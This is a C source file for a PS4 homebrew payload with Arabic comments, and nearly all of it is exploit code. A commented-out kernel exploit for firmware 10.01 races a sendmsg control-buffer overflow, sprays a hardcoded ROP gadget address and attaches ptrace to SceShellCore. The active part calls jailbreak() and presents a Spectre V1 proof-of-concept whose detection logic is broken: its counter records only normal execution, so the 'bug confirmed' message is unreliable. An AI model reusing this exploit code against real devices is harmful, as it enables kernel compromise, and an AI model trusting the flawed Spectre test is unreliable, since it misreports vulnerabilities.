/*
#include <ps4.h>

// --- تعريف الهياكل يدوياً لضمان اكتمال الأنواع (Complete Types) ---
struct cmsghdr {
    uint32_t cmsg_len;
    int      cmsg_level;
    int      cmsg_type;
};

struct msghdr {
    void            *msg_name;
    uint32_t         msg_namelen;
    struct iovec    *msg_iov;
    int              msg_iovlen;
    void            *msg_control;
    uint32_t         msg_controllen;
    int              msg_flags;
};

// حل مشكلة cpuset_t يدوياً لأنها غالباً مفقودة في هيدرات الـ SDK الافتراضية
#ifndef _CPUSET_T_DECLARED
typedef struct { uint64_t bits[16]; } cpuset_t;
#define _CPUSET_T_DECLARED
#endif

#ifndef CPU_ZERO
#define CPU_ZERO(p) memset((p), 0, sizeof(cpuset_t))
#endif

#ifndef CPU_SET
#define CPU_SET(n, p) ((p)->bits[(n)/64] |= (1ULL << ((n)%64)))
#endif

// إعدادات الاستغلال (Offsets 10.01)
#define PS4_PAGE_SIZE 0x4000
#define OVERFLOW_SIZE 1024 
#define NCMSG         14
#define OFF_PUSH_RSP_POP_RSI_RET 0x9B3EE6 

#ifndef PT_CONTINUE
#define PT_CONTINUE 7
#endif

uint8_t *BaseArea;
struct cmsghdr *ControlBuf;
size_t ControlBufLen;
volatile int stop_race = 0;
uint64_t n_tries = 0;
uint32_t current_delay = 50;

// --- 1. بناء البفر مع الرش الكثيف ---
void BuildPrecisionBuffer(uint64_t kbase) {
    size_t cmsgsize = NCMSG * sizeof(struct cmsghdr);
    size_t allocsz = (cmsgsize + OVERFLOW_SIZE + PS4_PAGE_SIZE - 1) & ~(PS4_PAGE_SIZE - 1);
    
    BaseArea = (uint8_t *)mmap(NULL, allocsz + PS4_PAGE_SIZE, PROT_READ | PROT_WRITE, 0x0002 | 0x1000, -1, 0);
    mprotect(BaseArea + allocsz, PS4_PAGE_SIZE, PROT_NONE);

    uint8_t *aligned_base = BaseArea + (allocsz - (cmsgsize + OVERFLOW_SIZE));
    ControlBuf = (struct cmsghdr *)aligned_base;
    ControlBufLen = cmsgsize;

    uintptr_t trigger = kbase + OFF_PUSH_RSP_POP_RSI_RET;
    uint8_t *overflow_ptr = (uint8_t *)aligned_base + cmsgsize;

    // الرش التصاعدي: ملء المنطقة بالكامل بالعنوان لضمان عدم وجود أصفار
    for (size_t i = 0; i < OVERFLOW_SIZE - 8; i += 8) {
        *(uintptr_t *)(overflow_ptr + i) = trigger;
    }

    for (int i = 0; i < NCMSG; i++) {
        ControlBuf[i].cmsg_len = (uint32_t)sizeof(struct cmsghdr);
        ControlBuf[i].cmsg_level = 0;
        ControlBuf[i].cmsg_type = 7; 
    }
}

// --- 2. خيط التخريب (Wrecker) ---
void *wrecker_thread(void *arg) {
    (void)arg;
    while (!stop_race) {
        ControlBuf[NCMSG-1].cmsg_len = (uint32_t)sizeof(struct cmsghdr);
        for(volatile uint32_t i = 0; i < current_delay; i++); 
        
        ControlBuf[NCMSG-1].cmsg_len = 0xFFFFFFFF;
        for(volatile int i = 0; i < 60; i++);

        current_delay++;
        if (current_delay > 1500) current_delay = 50; 
    }
    return NULL;
}

// --- 3. خيط التنفيذ (Executor) ---
void *executor_thread(void *arg) {
    (void)arg;
    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_control = ControlBuf;
    msg.msg_controllen = (uint32_t)ControlBufLen;
    const int bad_fd = 666;

    while (!stop_race) {
        n_tries++;
        syscall(28, bad_fd, &msg, 0); 
        
        if (errno == 14) { 
            stop_race = 1;
            break;
        }
    }
    return NULL;
}

// --- المدخل الرئيسي ---
int _main(struct thread *td) {
    (void)td;
    initKernel(); initLibc(); initSysUtil();
    
    // البحث والتعلق بـ SceShellCore باستخدام دوال الـ SDK
    int targetPID = findProcess("SceShellCore");
    if (targetPID > 0) {
        procAttach(targetPID);
        // استدعاء ptrace من الـ SDK لاستمرار العملية
        ptrace(PT_CONTINUE, targetPID, (void *)1, 0); 
    }

    uint64_t kbase = get_kernel_base();
    BuildPrecisionBuffer(kbase);

    // استخدام تعريفات cpuset_t التي أضفناها بالأعلى
    cpuset_t cpuset1, cpuset2;
    CPU_ZERO(&cpuset1); CPU_SET(1, &cpuset1); 
    CPU_ZERO(&cpuset2); CPU_SET(2, &cpuset2); 

    ScePthread wrid, exid;
    
    scePthreadCreate(&wrid, NULL, wrecker_thread, NULL, "wrecker");
    pthread_setaffinity_np(wrid, sizeof(cpuset_t), &cpuset1);

    scePthreadCreate(&exid, NULL, executor_thread, NULL, "executor");
    pthread_setaffinity_np(exid, sizeof(cpuset_t), &cpuset2);

    scePthreadJoin(exid, NULL);
    stop_race = 1;
    scePthreadJoin(wrid, NULL);

    if (targetPID > 0) {
        procDetach(targetPID);
    }

    return 0;
}
*/

#include "ps4.h"

uint8_t array1[16] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
uint8_t array2[256 * 512];
size_t array1_size = 16;
volatile uint8_t temp = 0;
volatile int speculative_hits = 0;  // ← لتتبع التنفيذ التخميني

static inline void flush_cache(void *addr) {
    __asm__ volatile ("clflush [%0]" : : "r"(addr));
}

static inline uint64_t read_tsc(void) {
    uint32_t lo, hi;
    __asm__ volatile ("rdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

static inline void mfence(void) {
    __asm__ volatile ("mfence" ::: "memory");
}

static inline void lfence(void) {
    __asm__ volatile ("lfence" ::: "memory");
}

// دالة الضحية - تظهر الثغرة
uint8_t victim_function(size_t x) {
    if (x < array1_size) {
        // هذا الكود يُنفذ تخمينياً حتى عندما x >= array1_size
        speculative_hits++;  // ← إثبات أن التنفيذ التخميني حدث
        uint8_t val = array1[x];
        temp &= array2[val * 512];
        return val;
    }
    return 0;
}

int _main(struct thread *td) {
    initKernel();
    initLibc();
    jailbreak();
    
    printf_debug("=== Spectre V1 Bug Proof-of-Concept ===\n");
    printf_debug("Demonstrating speculative execution vulnerability\n\n");
    
    // تهيئة array2
    for (int i = 0; i < 256 * 512; i++)
        array2[i] = 0xFF;
    
    volatile size_t malicious_x = 100;  // خارج الحدود!
    speculative_hits = 0;
    
    printf_debug("Step 1: Training branch predictor (100 iterations)\n");
    for (int i = 0; i < 100; i++)
        victim_function(i % array1_size);
    
    mfence();
    lfence();
    
    printf_debug("Step 2: Attempting out-of-bounds access (x=%d)\n", malicious_x);
    printf_debug("This should be rejected by bounds check, but...\n\n");
    
    // الهجوم - تنفيذ تخميني
    uint8_t result = victim_function(malicious_x);
    
    mfence();
    lfence();
    
    printf_debug("Results:\n");
    printf_debug("- Bounds check: x(%d) < array1_size(%d) = %s\n", 
                malicious_x, array1_size, 
                (malicious_x < array1_size) ? "true" : "false");
    printf_debug("- Function returned: %d\n", result);
    printf_debug("- Speculative execution count: %d\n\n", speculative_hits);
    
    if (speculative_hits > 100) {
        printf_debug("[!] BUG CONFIRMED: Speculative execution occurred!\n");
        printf_debug("[!] The CPU executed the out-of-bounds access\n");
        printf_debug("[!] despite the bounds check failing\n\n");
        printf_debug("Vulnerability: Spectre V1 (Bounds Check Bypass)\n");
        printf_debug("Affected: AMD Jaguar (PS4)\n");
    } else {
        printf_debug("[*] No speculative execution detected\n");
        printf_debug("[*] System may have Spectre mitigations enabled\n");
    }
    
    printf_debug("\n=== End of PoC ===\n");
    
    return 0;
}